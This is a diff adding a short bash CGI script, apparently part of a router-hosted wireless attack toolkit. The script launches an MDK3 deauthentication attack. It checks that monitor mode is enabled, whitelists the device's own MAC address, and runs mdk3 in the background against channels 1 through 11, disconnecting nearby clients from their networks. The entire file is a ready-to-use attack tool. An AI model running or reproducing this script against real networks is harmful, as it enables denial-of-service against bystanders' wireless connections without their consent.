@@ -1,0 +1,21 @@
+#!/bin/bash
+
+echo "Content-type: text/html"
+echo ""
+
+if [ !  -f /www/cgi-bin/sword/wifi/mon.txt ]; then
+
+echo "<script>alert(\"Wi-Fi monitor mode is not enabled on Mon0\")</script>"
+exit
+fi
+
+
+echo "<html><head><title>MDK3 Deauth </title></head>"
+
+ifconfig wlan0 | awk '/HWaddr/ {print $5}' > /www/cgi-bin/sword/wifi/mdk3/deauth-whitelist.txt
+
+mdk3 mon0 d -w /www/cgi-bin/sword/wifi/mdk3/deauth-whitelist.txt -c 1,2,3,4,5,6,7,8,9,10,11  > /www/cgi-bin/sword/wifi/mdk3/tmp.txt &
+
+#/www/cgi-bin/sword/wifi/mdk3/cat.sh
+/www/cgi-bin/sword/wifi/mdk3/refresh
+echo "</body></html>"
